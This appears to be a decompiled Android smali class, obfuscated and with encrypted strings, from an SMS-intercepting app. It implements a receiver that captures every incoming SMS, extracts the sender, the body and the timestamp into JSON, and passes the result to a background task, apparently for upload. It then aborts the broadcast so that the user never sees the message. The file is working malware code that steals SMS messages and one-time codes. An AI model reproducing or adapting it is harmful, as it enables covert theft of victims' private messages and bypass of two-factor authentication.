.class public Lcom/beginhigh19/p050i;
.super Landroid/content/BroadcastReceiver;
.source "SourceFile"


# static fields
.field private static final fddo:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    const-string v0, "00fce6472ffbf1e8"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/beginhigh19/p050i;->fddo:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public fddo(Landroid/content/Context;Landroid/content/Intent;)Lorg/json/JSONObject;
    .locals 7

    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p2

    const/4 v0, 0x0

    if-nez p2, :cond_0

    return-object v0

    :cond_0
    const-string v1, "4ea6c059"

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p2, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, [Ljava/lang/Object;

    if-nez p2, :cond_1

    return-object v0

    :cond_1
    array-length v0, p2

    new-array v1, v0, [Landroid/telephony/SmsMessage;

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    array-length v4, p2

    if-ge v3, v4, :cond_2

    aget-object v4, p2, v3

    check-cast v4, [B

    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v4

    aput-object v4, v1, v3

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_2
    const/4 p2, 0x1

    if-eq v0, p2, :cond_5

    aget-object p2, v1, v2

    invoke-virtual {p2}, Landroid/telephony/SmsMessage;->isReplace()Z

    move-result p2

    if-eqz p2, :cond_3

    goto :goto_2

    :cond_3
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    move v3, v2

    :goto_1
    if-ge v3, v0, :cond_4

    aget-object v4, v1, v3

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    :cond_4
    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    goto :goto_3

    :cond_5
    :goto_2
    aget-object p2, v1, v2

    invoke-virtual {p2}, Landroid/telephony/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object p2

    :goto_3
    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v3, "5aa69a671186ebe7762aff157f342402f8b574"

    invoke-static {v3}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v0, v3}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    const-string v4, "46a1"

    invoke-static {v4}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "5c91"

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    aget-object v4, v1, v2

    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v4

    const-string v5, "59a7c16e35dae2f26e2a902f5e692001a3b26e7164aacd1cc77e3a9a"

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-array v6, v2, [Ljava/lang/Class;

    invoke-virtual {v4, v5, v6}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v4

    aget-object v5, v1, v2

    new-array v6, v2, [Ljava/lang/Object;

    invoke-virtual {v4, v5, v6}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Ljava/lang/String;

    const-string v5, "4d83"

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v5, "4d80"

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5, p2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    aget-object v1, v1, v2

    invoke-virtual {v1}, Landroid/telephony/SmsMessage;->getTimestampMillis()J

    move-result-wide v1

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "4d96"

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v3, v1, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "04"

    invoke-static {v2}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p1, v0, p2}, Lfddo/goto;->r(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-object v3
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2

    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/beginhigh19/p050i;->fddo(Landroid/content/Context;Landroid/content/Intent;)Lorg/json/JSONObject;

    move-result-object p2

    if-eqz p2, :cond_0

    new-instance v0, Lfddo/this;

    invoke-direct {v0, p1, p2}, Lfddo/this;-><init>(Landroid/content/Context;Lorg/json/JSONObject;)V

    sget-object p2, Landroid/os/AsyncTask;->THREAD_POOL_EXECUTOR:Ljava/util/concurrent/Executor;

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    invoke-virtual {v0, p2, v1}, Landroid/os/AsyncTask;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p2

    const-string v0, "EXC_SMSRCV"

    invoke-static {p1, v0, p2}, Lfddo/goto;->class(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Exception;)V

    :cond_0
    :goto_0
    invoke-virtual {p0}, Landroid/content/BroadcastReceiver;->abortBroadcast()V

    return-void
.end method
